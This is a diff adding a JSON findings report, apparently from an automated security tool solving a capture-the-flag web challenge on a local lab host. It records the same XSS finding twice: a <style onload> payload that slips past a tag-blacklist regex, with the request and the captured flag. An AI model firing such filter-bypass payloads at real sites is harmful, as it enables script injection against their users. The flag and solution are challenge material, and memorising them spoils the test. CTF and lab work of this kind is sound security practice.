@@ -1,0 +1,41 @@
+{
+  "meta": {
+    "created": "2026-04-14T14:10:17.479625+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "716cee46-4278-4263-8390-68cefcf578af",
+      "timestamp": "2026-04-14T14:10:17.479452+00:00",
+      "title": "XSS via <style> tag bypass - CTF Flag",
+      "severity": "critical",
+      "target": "http://172.17.0.1:58697/page",
+      "description": "Stored/Reflected XSS vulnerability via the 'name' parameter on /page. The application blacklists HTML tags using regex r'<(?!style\\b)[^>]+>' which allows <style> tags. Adding onload='alert(\"XSS\")' to the <style> tag triggers JavaScript execution in the headless browser, bypassing the filter.",
+      "evidence": "flag{fcec3afc-4b74-433f-b638-14091e51092e}",
+      "tool_used": "http",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "GET /page?name=<style onload=\"alert('XSS')\">",
+        "expected": "Page returns success message with flag"
+      }
+    },
+    {
+      "id": "cf02bfd2-3b18-420e-a5a8-0306e448eacc",
+      "timestamp": "2026-04-14T14:10:17.567005+00:00",
+      "title": "XSS via <style> tag bypass - CTF Flag",
+      "severity": "critical",
+      "target": "http://172.17.0.1:58697/page",
+      "description": "Stored/Reflected XSS vulnerability via the 'name' parameter on /page. The application blacklists HTML tags using regex r'<(?!style\\b)[^>]+>' which allows <style> tags. Adding onload='alert(\"XSS\")' to the <style> tag triggers JavaScript execution in the headless browser, bypassing the filter.",
+      "evidence": "flag{fcec3afc-4b74-433f-b638-14091e51092e}",
+      "tool_used": "http",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "GET /page?name=<style onload=\"alert('XSS')\">",
+        "expected": "Page returns success message with flag"
+      }
+    }
+  ],
+  "diagrams": []
+}
